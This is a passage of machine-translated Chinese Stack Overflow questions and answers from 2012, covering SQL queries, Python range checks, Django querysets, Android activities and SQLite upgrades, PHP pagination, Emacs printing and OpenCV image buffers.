```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/3d8bb/2)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:48:47.587

试试这个：

```
SELECT * FROM TABLE b WHERE Y = 2 AND EXISTS (SELECT * FROM TABLE WHERE b.X = X AND Y = 3); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-28T06:50:28.587

您需要使用`OR`在您的`WHERE`子句中创建一个布尔表达式

```
SELECT * FROM table WHERE (y = 2) OR (y = 3); 
```

如果由于许多`y`值而变得乏味，则使用`IN`

```
SELECT * FROM table WHERE y IN (2,3); 
```

# python - 如何检查一个数字是否在一组不连续的范围内？

> ID：13599347
> 
> 赞同：1
> 
> 时间：2012-11-28T06:47:17.303
> 
> 标签：python, range

问题可能听起来很复杂，但实际上很简单，但我在 Python 中找不到任何好的解决方案。

我有像 `("8X5000", "8X5099")`. 这里`X`可以是任何数字，所以我想匹配属于某个范围（`805000..805099`或`815000..815099`或... `895000..895099`）的数字。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T08:51:34.403

@TimPietzcker 的答案是正确的并且是 Pythonic，但它会引起一些性能问题（可以说使它更加 Pythonic）。它创建一个搜索值的迭代器。我不希望 Python 能够优化搜索。

这应该表现更好：

```
def IsInRange(n, r=("8X5000", "8X5099")):
    (minr, maxr) = [[int(i) for i in l.split('X')] for l in r]
    p = len(r[0]) - r[0].find('X')

    nl = (n // 10**p, n % 10**(p-1))
    fInRange = all([minr[i] <= nl[i] <= maxr[i] for i in range(2)])
    return fInRange 
```

函数内的第二行是嵌套列表理解，因此可能有点难以阅读，但它设置：

```
minr = [8, 5000]
maxr = [8, 5099] 
```

当 n = 595049 时：

```
nl = (5, 5049) 
```

该代码只是将范围拆分为多个部分（同时转换为 int），将目标编号拆分为多个部分，然后范围检查这些部分。增强它以处理范围说明符中的多个 X 并不难。

## 更新

我刚刚使用 timeit 测试了相对性能：

```
def main():
    t1 = timeit.timeit('MultiRange.in_range(985000)', setup='import MultiRange', number=10000)
    t2 = timeit.timeit('MultiRange.IsInRange(985000)', setup='import MultiRange', number=10000)

    print t1, t2
    print float(t2)/float(t1), 1 - float(t2)/float(t1) 
```

在我运行 Python 2.7.2 的 32 位 Win 7 机器上，我的解决方案几乎比 @TimPietzcker 的解决方案快 10 倍（具体来说，它在 12% 的时间内运行）。当你增加范围的大小时，它只会变得更糟。什么时候：

```
ranges=("8X5000", "8X5999") 
```

性能提升 50 倍。即使对于最小的范围，我的版本运行速度也快了 4 倍。

使用@PaulMcGuire 建议的性能补丁`in_range`，我的版本运行速度提高了 3 倍。

## 更新 2

受到@PaulMcGuire 评论的启发，我继续将我们的函数重构为类。这是我的：

```
class IsInRange5(object):
    def __init__(self, r=("8X5000", "8X5099")):
        ((self.minr0, self.minr1), (self.maxr0, self.maxr1)) = [[int(i) for i in l.split('X')] for l in r]
        pos = len(r[0]) - r[0].find('X')
        self.basel = 10**(pos-1)
        self.baseh = self.basel*10
        self.ir = range(2)

    def __contains__(self, n):
        return self.minr0 <= n // self.baseh <= self.maxr0 and \
            self.minr1 <= n % self.basel <= self.maxr1 
```

这确实缩小了差距，但即使在预先计算范围不变量（两者）之后@PaulMcGuire 的时间也增加了 50%。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:52:18.293

```
range = (80555,80888)

x = 80666

print range[0] < x < range[1] 
```

也许你在找什么...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:04:55.433

Python 3 的示例（在 Python 2 中，使用`xrange`代替`range`）：

```
def in_range(number, ranges=("8X5000", "8X5099")):
    actual_ranges = ((int(ranges[0].replace("X", digit)),
                     int(ranges[1].replace("X", digit)) + 1)
                     for digit in "0123456789")
    return any(number in range(*interval) for interval in actual_ranges) 
```

结果：

```
>>> in_range(805001)
True
>>> in_range(895099)
True
>>> in_range(805100)
False 
```

Paul McGuire 建议对此进行改进（谢谢！）：

```
def in_range(number, ranges=("8X5000", "8X5099")):
    actual_ranges = ((int(ranges[0].replace("X", digit)),
                     int(ranges[1].replace("X", digit)))
                     for digit in "0123456789")
    return any(minval <= number <= maxval for minval, maxval in actual_ranges) 
```

# java - lwuit 向导和部署

> ID：13599358
> 
> 赞同：0
> 
> 时间：2012-11-28T06:47:57.383
> 
> 标签：java, java-me, lwuit, codenameone

我正在使用 lwut 和 Codenameone 开发 J2ME 应用程序，并在很长时间内创建了它。在我创建它之后，我想将它部署在诺基亚、三星、LG 等支持 MIDP 的设备中。所以我发现诺基亚设备运行它没有错误，而三星和其他公司的设备有一些我不明白为什么的问题？！

所以我尝试了不同的方式来创建这个应用程序。我使用了带有空白主题和手动模板的 Codenameone 向导，然后我尝试部署它。嗯，没错。我取得了成功，它也在三星设备上运行。之后，我尝试在此应用程序中向“主题”添加一些表单并在模拟器中运行它。我在主类中更改了一些代码，如下所示：

```
public class Main extends UIBuilder {

private Form current;

public void init(Object context) {
    try{
        Resources theme = Resources.openLayered("/theme");
        UIManager.getInstance().setThemeProps(theme.getTheme(theme.getThemeResourceNames()[0]));
   }catch(IOException e){
        e.printStackTrace();
    }
}

public void start() {
    if(current != null){
        current.show();
        return;
    }
Form hi = findMain();//new Form("Hi World");
//hi.addComponent(new Label("Hi World"));
hi.show();
}

public void stop() {
    current = Display.getInstance().getCurrent();
}

public void destroy() {
}

public com.codename1.ui.Form findMain() {
    return (com.codename1.ui.Form)findByName("Main", Display.getInstance().getCurrent());
}} 
```

我运行它时出错。

所以这是我的问题：我在 Codenameone 的可视模式下创建了一个应用程序。如何在三星和三星等其他设备上运行它（没有操作系统，只支持 java 或 MIDP）？如何在 Codenameone 中将我的可视模式应用程序更改为手动模式？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T13:49:14.913

您是从生命周期类中派生的，`UIBuilder`并尝试在尚未显示的内容上使用 finder 方法。您的代码绝对不可能在模拟器中工作，而且它不是由向导生成的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-08T09:25:03.777

谢谢夏。为了创建，我进行了硬编码并一一创建了所有表单。

我实现了派生自基本表单的基本表单，`com.codenameone.ui.Form`并且每个表单都派生自基本表单。

# python - 不想在 django 中显示模型对象的所有项目

> ID：13599359
> 
> 赞同：0
> 
> 时间：2012-11-28T06:48:09.133
> 
> 标签：python, django

```
class TaskManager(models.Manager):
    def get_query_set(self):
         return super(TaskManager, self).get_query_set().filter(Owner='jim')

class Task(models.Model):
    Name = models.CharField('Title', max_length=200)
    Notes = models.TextField('Description',max_length=2000, null=True)
    project = models.ForeignKey(Project,null=True, blank=True)
    Owner = models.CharField(max_length=100, choices=owner_set)

    objects =  TaskManager()
    def __unicode__(self):
    return self.Name 
```

我的 models.py 中有两个模型，每个任务都有一个项目。但是当我进入任务页面时，它会默认列出所有任务。所以我希望它只列出当前用户的 Task `by default`。就是Task.Owner=当前用户。谁能帮帮我，谢谢！

我从网上搜索然后得到解决方案：我更新了我刚刚粘贴在上面的代码。谢谢大家。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:58:09.967

为什么不这样做！

```
Task.objects.filter(owner = current_user) 
```

更新：

1）如果您想过滤您自己的自定义模板，请将其添加到您的视图代码中

2) 如果您尝试自定义管理站点，请执行此操作，

```
from django.contrib import admin
from models import MyModel

class TaskAdmin(admin.ModelAdmin): 

    def queryset(self, request): 
        return super(TaskAdmin, self).queryset(request).filter(owner = request.user)

admin.site.register(Task, TaskAdmin) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T16:13:44.803

在 ModelAdmin 类中，您应该添加：

```
class TaskAdmin(...):

    def queryset(self, request):
         qs = super(TaskAdmin, self).queryset(request)
         return qs.filter(Owner=request.user) 
```

这将覆盖默认查询集

更多信息： [https ://docs.djangoproject.com/en/dev/ref/contrib/admin/#django.contrib.admin.ModelAdmin.queryset](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#django.contrib.admin.ModelAdmin.queryset)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:47:14.030

我只是想修改一个模型的默认过滤器，使模型列表不是没有modelAdmin的所有项目，因为modelAdmin只是提供了一个需要手动点击的过滤器，我想默认自动过滤模型

# sql - 如何检查日期是从一月到六月和七月到十二月的月份

> ID：13599374
> 
> 赞同：1
> 
> 时间：2012-11-28T06:48:41.767
> 
> 标签：sql, oracle11g

我有个约会。我想检查日期是在 1 月到 6 月还是 7 月到 12 月之间。就像假设如果用户输入输入日期 28-NOV-12 那么我如何检查该日期是否介于 7 月到 12 月之间？如果用户输入日期 28-FEB-12 那么这个日期介于 1 月到 6 月之间？基本上我想每半年检查一次日期？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:25:53.390

```
select sign(2.5-to_char(<date>, 'q')) from dual; 
```

返回`1`日期为 1 月 1 日至 6 月 30 日或`-1`其他日期。

**说明**：

`to_char(date, 'q')`返回日期的一年中的*季度*（*1、2、3、4；一月 - 三月 = 1）*（[请参阅格式模型](http://docs.oracle.com/cd/E11882_01/server.112/e26088/sql_elements004.htm#CDEHIFJA)）。对于 11 月 28 日，这将是 4。

 *`2.5-quarter`分别为第 3 和第 4 季度返回负数，为第 1 和第 2 季度返回正数。将`sign`负数和正数简化为更简单的`-1`和`1`。

**测试用例**：

```
with da as (
  select date '2012-01-01' te from dual union all
  select date '2012-02-02' te from dual union all
  select date '2012-03-03' te from dual union all
  select date '2012-04-04' te from dual union all
  select date '2012-05-05' te from dual union all
  select date '2012-06-06' te from dual union all
  select date '2012-07-07' te from dual union all
  select date '2012-08-08' te from dual union all
  select date '2012-09-09' te from dual union all
  select date '2012-10-10' te from dual union all
  select date '2012-11-11' te from dual union all
  select date '2012-12-12' te from dual
)
select 
  da.te,
  decode (sign(2.5-to_char(da.te, 'q')),
           1, 'Jan-Jun',
          -1, 'Jul-Dec')
from da; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:58:09.420

```
select * from table "28-NOV-2012" WHERE date_column  between TO_DATE('01-JAN-2012') AND TO_DATE('01-JUN-2012'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:04:27.617

尝试[`to_char`function](http://www.techonthenet.com/oracle/functions/to_char.php)，例如这样：

```
select
    case
        when to_char(date_column, 'mm') <= 6 then '1st' 
        when to_char(date_column, 'mm') >= 7 then '2nd'
    end as half_of_the_year
from your_table 
```

`to_char(date_column, 'mm')`返回日期的月份 (01..12, 01 - January) 部分。

```
select
    case
        when to_char(sysdate, 'mm') <= 6 then '1st' 
        when to_char(sysdate, 'mm') >= 7 then '2nd'
    end as half_of_the_year
from dual 
```

今天回归：

```
HALF_OF_THE_YEAR
2nd 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:15:35.820

试试这个，date_column 应该是日期数据类型，否则明智地更改为 TO_DATE(date_column)

```
select
case
    when date_column BETWEEN  TO_DATE('01-JAN-12') AND TO_DATE('03-JUN-12')then '1st Half' 
    ELSE '2nd Half'
end as DatePosition
from table_name 
```*

# java - 多布局 Android 应用程序

> ID：13599377
> 
> 赞同：1
> 
> 时间：2012-11-28T06:48:52.033
> 
> 标签：java, android, layout, android-emulator, intellij-idea

我有一个使用 IntelliJ 12 Community Edition IDE 的 Android 程序。我需要在使用按钮制作的不同布局 (.xml) 之间导航。但是，每当我使用模拟器运行它时，它只会打开 main.xml 屏幕，每当我单击按钮时，它都会显示：“不幸的是，ITax 已停止工作。”

这是我的 MyActivity.java 类的代码：

```
package com.example.ITax;

import android.app.Activity;
import android.content.Intent;
android.os.Bundle;
android.view.View;
import android.widget.Button;

public class MyActivity extends Activity {

@Override
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    Button button1 = (Button)findViewById(R.id.btn_info);
    Button button2 = (Button)findViewById(R.id.btn_tutorial);
    Button button3 = (Button)findViewById(R.id.btn_calc);
    Button button4 = (Button)findViewById(R.id.btn_back_from_calcu);
    Button button5 = (Button)findViewById(R.id.btn_next_from_calcu);
    Button button6 = (Button)findViewById(R.id.btn_back_from_monthlyorannual);
    Button button7 = (Button)findViewById(R.id.btn_next_from_monthlyorannual);
    Button button8 = (Button)findViewById(R.id.btn_back_from_civilstatus);
    Button button9 = (Button)findViewById(R.id.btn_next_from_civilstatus);
    Button button10 = (Button)findViewById(R.id.btn_back_from_inputamount_monthly);
    Button button11 = (Button)findViewById(R.id.btn_compute_from_monthly);
    Button button12 = (Button)findViewById(R.id.btn_back_from_outputamount_monthly);
    Button button13 = (Button)findViewById(R.id.btn_home_from_outputamount_monthly);

}

public void Open_BasicInfo()
{
    Intent i = new Intent(this, OpenBasicInfo.class);

    startActivity(i);
}

public void Open_Tutorial()
{
    Intent i = new Intent(this, OpenTutorial.class);
    startActivity(i);
}

public void Open_Calculator()
{
    Intent i = new Intent(this, OpenCalculator.class);
    startActivity(i);
}

public void Open_MonthlyOrAnnually()
{
    Intent i = new Intent(this, OpenMonthlyOrAnnually.class);
    startActivity(i);
}

public void Open_CivilStatus()
{
    Intent i = new Intent(this, OpenCivilStatus.class);
    startActivity(i);
}

public void Open_InputAmountsFromMonthly()
{
    Intent i = new Intent(this, OpenInputAmountsFromMonthly.class);
    startActivity(i);
}

public void Open_OutputAmountsFromMonthly()
{
    Intent i = new Intent(this, OutputAmountsFromMonthly.class);
    startActivity(i);
}

public void Open_Main()
{
    Intent i = new Intent(this, MyActivity.class);
    startActivity(i);
}

} 
```

我已经为每个布局创建了一个类，并在 Android 清单中声明如下：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
      package="com.example.ITax"
      android:versionCode="1"
      android:versionName="ITax 1.0">
<uses-sdk android:minSdkVersion="1"/>
<application android:label="@string/app_name" android:icon="@drawable/ic_launcher">

    <activity android:name=".MyActivity"
              android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>

    <activity android:name=".OpenCalculator">

    </activity>

    <activity android:name=".OpenCivilStatus">

    </activity>

    <activity android:name=".OpenInputAmountsFromMonthly">

    </activity>

    <activity android:name=".OutputAmountsFromMonthly">

    </activity>

    <activity android:name=".OpenTutorial">

    </activity>

    <activity android:name=".OpenBasicInfo">

    </activity>

    <activity android:name=".OpenMonthlyOrAnnually">

    </activity>

    <activity android:name=".OpenMain">

    </activity>

    </application>
</manifest> 
```

我已经将代码 android:onClick = "name of method" 放在所有按钮中。

帮助！我在这里做错了什么？:(

每当我单击按钮时，模拟器中的应用程序就会停止工作。>.<

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:59:37.703

为了遵守xml android:onclick="MethodName"。您的活动必须实现如下所示的方法...

```
public void MethodName(View v){} 
```

您的所有 onclick 事件都缺少传递 View 参数。

我个人不喜欢使用 xml，因为如果您在代码中犯了拼写错误。您的活动将崩溃，因为它不能膨胀 xml。这个 imo 让你容易犯愚蠢的错误。 [这里有一个链接，其中包含有关执行按钮 onclick 事件](http://tekeye.biz/2012/code-android-event-listeners)的所有方法的更多详细信息，最终由您决定。

# charts - 如何用d3制作交互式树形图？

> ID：13599379
> 
> 赞同：6
> 
> 时间：2012-11-28T06:49:09.813
> 
> 标签：charts, treeview, d3.js

是否有任何示例可以说明如何使用 D3 设计一个交互式树形图，例如 Pearltrees.com 网站（例如，请参见[此处](http://www.pearltrees.com/#/N-s=1_465472&N-p=6845530&N-u=1_37150&N-fa=465472&N-f=1_465472)）？

谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-01T22:34:59.810

您可以创建一个力导向图来执行以下操作：

[http://mbostock.github.com/d3/talk/20110921/#20](http://mbostock.github.com/d3/talk/20110921/#20)

你需要做一些工作：

1.  将图像动态添加到节点（此示例为每个节点[添加一个 favicon ）](http://bl.ocks.org/950642)
2.  允许用户展开/折叠部分树。（[此示例执行此操作，但使用树布局](http://mbostock.github.com/d3/talk/20111018/tree.html)）。
3.  将 HTML 链接添加到末端节点（[此示例显示节点如何链接到其他页面](http://bl.ocks.org/1625629)）。

# ruby-on-rails - 从 s3carrierwave rails heroku 下载文件夹为 zip

> ID：13599381
> 
> 赞同：3
> 
> 时间：2012-11-28T06:49:14.690
> 
> 标签：ruby-on-rails, heroku, amazon-s3, zip, carrierwave

对于使用carrierwave和s3的rails应用程序

如何将目录作为 zip 文件提供？我有

```
/folder/
 file1.png
 file2.png
 file3.png 
```

当用户转到 /folder.zip 时，他们应该下载包含上述目录的“.zip”文件。

这是我需要用 s3 设置的东西吗？它是载波的东西吗？我需要另一个宝石吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-26T20:03:36.667

有点晚了，但我遇到了同样的问题。

您可以检查[使用 CarrierWave 上传到 S3 的下载和压缩文件](https://stackoverflow.com/questions/9908571/downloading-and-zipping-files-that-were-uploaded-to-s3-with-carrierwave)

# c - 如何使用 MinGW 从 C 语言中的函数指针获取函数名称？

> ID：13599382
> 
> 赞同：0
> 
> 时间：2012-11-28T06:49:14.983
> 
> 标签：c, windows, mingw

我已经看到了这个答案[How to get function's name from function's pointer in C?](https://stackoverflow.com/questions/351134/how-to-get-functions-name-from-functions-pointer-in-c) . 但这个解决方案适用于 linux。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:01:33.423

I found this [http://ivbel.blogspot.fr/2012/02/how-to-get-functions-name-from.html](http://ivbel.blogspot.fr/2012/02/how-to-get-functions-name-from.html)

```
 res = SymGetSymFromAddr64(GetCurrentProcess(), addr, &dis64, pSym);
if (!res)
{
    /* TODO: call your trace function instead of printf */
    printf("SymGetSymFromAddr64 fails, error=%ld\n", GetLastError());
    return FALSE;
}
else
{
    strcpy(symbolName, pSym->Name);
} 
```

The full code is on the link

# android - context.getCachedir() 和 Environment getConDownloadCacheDirectory android

> ID：13599383
> 
> 赞同：1
> 
> 时间：2012-11-28T06:49:17.060
> 
> 标签：android, android-sdcard

`context.getCachedir()`和环境`getConDownloadCacheDirectory`一样吗？

我正在实现位图缓存并混淆使用哪一个。
如果我使用上下文，那么我们将需要保存对上下文的引用，这可能会导致内存泄漏。
那么使用哪一个呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T07:11:03.907

是的，有区别。

context.getCachedir() = /data/data/your.application.package/cache（这是绝对路径）

Environment.getConDownloadCacheDirectory() = /cache（这是相对路径）

# php - put isset($_GET('start') 它不会在 paging.php 上显示下一页

> ID：13599386
> 
> 赞同：0
> 
> 时间：2012-11-28T06:49:32.630
> 
> 标签：php

```
$page_name= (isset($_POST['page_name'])); 
@$limit=$_GET['limit'];

if(strlen($limit) > 0 and !is_numeric($limit)){
    echo "Data Error";
    exit;
}
switch($limit)
{
    case 2:
        $select2="selected";
        $select10="";
        $select5="";
        break;

    case 5:
        $select5="selected";
        $select10="";
        $select2="";
        break;

    default:
        $select10="selected";
        $select5="";
        $select2="";
        break;
}

$start=($_GET['start']);  // THIS PART!//

if(strlen($start) > 0 and !is_numeric($start)){
    echo "Data Error111";
    exit;
}

$eu = ($start - 0); 

if(!$limit > 0 ){ 
    $limit = 10;    
}              

$this1 = $eu + $limit; 
$back = $eu - $limit; 
$next = $eu + $limit; 

$query=" SELECT * FROM tblename  ";
$result=mysql_query($query);

echo mysql_error();
$nume=mysql_num_rows($result);
$query=" SELECT * FROM tblname  limit $eu, $limit ";
$result=mysql_query($query);
echo mysql_error();
<?php while($row_Recordset1 = mysql_fetch_array($result)) { ?>
      <tr>
        <td><?php echo $row_Recordset1['Id']; ?></td>
        <td><?php echo $row_Recordset1['country']; ?></td>
<?php
    if($back >=0) { 
    print "<a href='$page_name?start=$back&limit=$limit'><font face='Verdana' size='2'>PREV</font></a>"; 
} 

echo "</td><td align=center width='30%'>";

$i=0;
$l=1;

for($i=0;$i < $nume;$i=$i+$limit){
    if($i <> $eu){
        echo " <a href='$page_name?start=$i&limit=$limit'><font face='Verdana' size='2'>$l</font></a> ";
    }
    else { 
        echo "<font face='Verdana' size='4' color=red>$l</font>";
    }        
    $l=$l+1;
}

echo "</td><td  align='right' width='30%'>";

if($this1 < $nume) { 
    print "<a href='$page_name?start=$next&limit=$limit'><font face='Verdana' size='2'>NEXT</font></a>";
} 
echo "</td></tr></table>";
?> 
```

抱歉，伙计们..如果我添加 isset 以开始定义的 $start 变量，当我运行它时，它会显示数据，比如说 10 个国家/地区名称，但是当我单击下一步以显示第 2 页时，它会出现相同的结果第 1 页中的国家名称不是第 2 页中的其他名称，如果我不将 isset 设置为 $start，它会在第 1 页显示 10 个国家，当我单击下一步查看第 2 页时，它会成功显示其他不同的 10 个国家/地区名称，那我该怎么办？我必须纠正什么错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:59:35.037

代替

```
$start=($_GET['start']); 
```

至

```
$start=1;//some default value
if(isset($_GET['start']))
 $start=$_GET['start']; 
```

# emacs - Emacs：使用行号打印

> ID：13599387
> 
> 赞同：4
> 
> 时间：2012-11-28T06:49:38.803
> 
> 标签：emacs, printing

有谁知道如何在页边空白处打印代码的行号？我可以显示行号，不能在打印输出中显示。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T10:20:16.673

You can add the line numbers with temporary overlays and convert the buffer to HTML using the [`htmlize`](http://emacswiki.org/emacs/Htmlize) package, after which you can save the HTML and print using `lpr` or a browser.

```
(defun htmlize-with-line-numbers ()
  (interactive)
  (goto-char (point-min))
  (let ((n 1))
    (while (not (eobp))
      (htmlize-make-tmp-overlay (point) (point) `(before-string ,(format "%4d " n)))
      (setq n (1+ n))
      (forward-line 1)))
  (switch-to-buffer (htmlize-buffer))) 
```

This will require a recent version of `htmlize`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-28T13:13:43.540

当然，一种简单但不可靠的方法是将行号直接临时插入缓冲区

```
C-<
C-M-% ^ RET \,(1+ \#) SPC RET 
```

然后打印它

```
M-x print-buffer 
```

然后再次撤消行号：

```
C-/
C-u C-SPC 
```

结果不是很漂亮，但可以使用。主要存在三个问题：

*   您正在对缓冲区进行更改。特别是，这意味着缓冲区不能是只读的。
*   行号是左对齐的，这意味着您会根据行号中的位数获得不同的缩进。
*   您的主要模式将跳过行号，您将失去语法突出显示。如果您在黑白打印机上打印，这不是问题。

您可以通过使用更复杂的替换字符串来修复第二点：

```
\,(format "%4d " (1+ \#)) 
```

但是你必须知道最大行号是多少，这样你才能在`%`和之间给出正确的位数`d`。您当然可以快速跳转到缓冲区的末尾以检查最大行号。但更重要的是，每次要打印行号时都输入所有内容变得很痛苦。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-03-30T21:57:46.340

对于这么旧的帖子的解决方案，我们深表歉意。我使用`ps-print-buffer`了而不是`print-buffer`，因为结果*看起来*更好看。无论如何，由于某种原因，手册中没有记录它，但是如果您查看 的源代码`ps-print.el`，您会发现`ps-line-number`可以设置为非零的变量，以便包括行号。

```
M-x set-variable RET ps-line-number RET t 
```

那应该暂时设置它，以便您可以打印。您可能希望将其永久设置在您的`init.el`.

您还可以使用`M-x pr-interface`命令进行打印，该命令会显示各种打印选项的缓冲区。

# c# - OpenCV 从字节数组创建 Mat

> ID：13599395
> 
> 赞同：13
> 
> 时间：2012-11-28T06:50:02.690
> 
> 标签：c#, c++, opencv

在我的 C++ dll 中，我从字节数组创建 Mat：

```
BYTE * ptrImageData;  //Image data is in this array passed to this function

Mat newImg = Mat(nImageHeight, nImageWidth, CV_8UC3, ptrImageData); 
```

图像是用一些灰色阴影而不是原始阴影创建的。

这是从字节数组创建 Mat 的正确方法吗？

请看代码

ptrImageData 从 C# 代码传递给 C++ dll。

传递图像数据的 C# 代码

```
System.Drawing.Image srcImage //Has the image
MemoryStream ms = new MemoryStream(); 
Marshal.FreeHGlobal(ptrImageData); 
srcImage.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg); 
byte[] imgArray = ms.ToArray();
ms.Dispose();

int size1 = Marshal.SizeOf(imgArray[0]) * imgArray.Length;
IntPtr ptrImageData = Marshal.AllocHGlobal(size1);
Marshal.Copy(imgArray, 0, ptrImageData, imgArray.Length);

//Calling C++ dll function
ProcessImage(ptrImageData, srcImage.Width, srcImage.Height);

Marshal.FreeHGlobal(ptrImageData); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-09-28T11:39:31.213

C++ 代码看起来没问题，因为这会为提供的图像数据创建一个矩阵*包装器*，假设缓冲区是传统的 RGB8 格式。请注意，此构造函数*不会*复制缓冲区，因此缓冲区必须在此实例的持续时间内保持有效`Mat`（或被复制）。

```
Mat newImg = Mat(nImageHeight, nImageWidth, CV_8UC3, ptrImageData); 
```

看来问题在于您的 C# 代码。我不是 C# 开发人员，但我会尽力提供帮助。您正在创建一个内存流并使用 JPEG 编解码器将图像的压缩版本写入缓冲区，就像它是一个文件一样。但这*不是*预期的数据格式`cv::Mat`，因此您基本上会看到垃圾（压缩数据解释为未压缩）。

给定一个`System.Image.Drawing.Image`实例，您可以直接创建一个包装器`Bitmap`对象（或者可以使用`as`，因为它是一个简单的向下转换）。然后，您可以使用该[`Bitmap.LockBits()`](https://msdn.microsoft.com/en-us/library/5ey6h79d(v=vs.110).aspx)方法获取指向底层图像数据的指针。

```
Bitmap bmp = new Bitmap(sourceImage);

// Lock the bitmap's bits.  
Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
System.Drawing.Imaging.BitmapData bmpData =
    bmp.LockBits(rect, System.Drawing.Imaging.ImageLockMode.ReadWrite,
    bmp.PixelFormat);

// Get the address of the first line.
IntPtr ptr = bmpData.Scan0;

// Declare an array to hold the bytes of the bitmap.
int bytes  = Math.Abs(bmpData.Stride) * bmp.Height;
byte[] rgbBuffer = new byte[bytes];

// Copy the RGB values into the array.
System.Runtime.InteropServices.Marshal.Copy(ptr, rgbBuffer, 0, bytes);

// Do your OpenCV processing...
// ...

// Unlock the bits.
bmp.UnlockBits(bmpData); 
```

然后您可以将 传递`rgbBuffer`给 OpenCV。

我也不相信原始代码中的内存管理是完全正确的，但无论如何，只要缓冲区所有权的范围在 lock 和 unlock 方法调用内，上述方法就可以工作。如果图像数据的寿命超过此代码块，则必须复制缓冲区。

也要小心你的像素格式——你需要确保`Image/Bitmap`实例确实包含 RGB8 数据。OpenCV`cv::Mat`有各种标志，因此您可以使用各种内存中的图像格式。但请注意，这些*与*磁盘上的（通常是压缩的）格式不同，例如 PNG、TIFF 等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T18:23:22.767

是的，这是从字节数组创建 Mat 的一种方法。您只需要注意您的数组包含您认为的内容。

> 图像是用一些灰色阴影而不是原始阴影创建的。

所以你在 newImg 中得到一个图像？原始数据的像素格式是什么？

也许您已经切换了红色和蓝色通道。以下行将交换通道：

```
cv::cvtColor(newImg,swappedImg,CV_RGB2BGR); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-24T09:15:39.460

这是文档的链接：http: [//docs.opencv.org/modules/core/doc/basic_structures.html#mat-mat](http://docs.opencv.org/modules/core/doc/basic_structures.html#mat-mat)

一般来说，你应该注意两件事：

1.  当您将外部数据传递给矩阵构造函数时，外部数据不会自动释放，因此您应该注意它。如果您希望 OpenCV 矩阵关心内存，那么您应该复制矩阵（您可以通过多种方式进行，例如使用[Mat::clone](http://docs.opencv.org/modules/core/doc/basic_structures.html#mat-clone)或[Mat::copyTo](http://docs.opencv.org/modules/core/doc/basic_structures.html#mat-copyto)方法。
2.  外部数据可能不是连续的，即行的大小可能大于宽度乘以通道数乘以数据元素的大小。因此，您可能希望将“step”指定为构造函数的最后一个参数。如果您手动分配外部数据并且100％确定它是连续的，那么您可能无法通过步骤并依赖自动步骤计算。

我不熟悉 C#，但在我看来，您在 ProcessImage 调用后立即释放数据。因此，如果 ProcessImage 是异步的或以某种方式缓存您的矩阵（即矩阵的生命周期比 ProcessImage 调用更长），那么您应该关心内存管理。

# android - 在 SQLite 数据库中完成更改后没有创建数据库

> ID：13599397
> 
> 赞同：3
> 
> 时间：2012-11-28T06:50:03.630
> 
> 标签：android, android-sqlite, sqliteopenhelper

有人可以帮忙`SQLite database`吗`android`？

首先，我从[这里](http://www.vogella.com/articles/AndroidSQLite/article.html)开始使用教程。它在我的应用程序中运行良好，但是当我添加新列并将`database`版本更改为“2”时，应用程序停止并且在文件资源管理器中，没有`database`找到。任何人都可以说明问题所在和解决方案。

编辑：这是我的一些更改.. 这是我的 FirstClass.java

```
// Database creation SQL statement
  private static final String DATABASE_CREATE = "create table " 
      + TABLE_TODO
      + "(" 
      + COLUMN_ID + " integer primary key autoincrement, " 
      + COLUMN_CATEGORY + " text not null, " 
      + COLUMN_SUMMARY + " text not null," 
      + COLUMN_DESCRIPTION
      + " text not null" 
      + COLUMN_DATE + "date not null " //i have added the date column
      + ");";
     public static void onCreate(SQLiteDatabase database) {
    database.execSQL(DATABASE_CREATE);

  }

  public static void onUpgrade(SQLiteDatabase database, int oldVersion,
      int newVersion) {
    Log.w(FirstClass.class.getName(), "Upgrading database from version "
        + oldVersion + " to " + newVersion
        + ", which will destroy all old data");
    database.execSQL("DROP TABLE IF EXISTS " + TABLE_TODO);
   // database.execSQL("INSERT INTO "+TABLE_TODO+" VALUES (null, datetime()) ");
    onCreate(database);
  } 
```

这是我的 TodoDatabaseHelper.java

```
private static final String DATABASE_NAME = "todotable2.db";
  private static final int DATABASE_VERSION = 2;

  public TodoDatabaseHelper(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
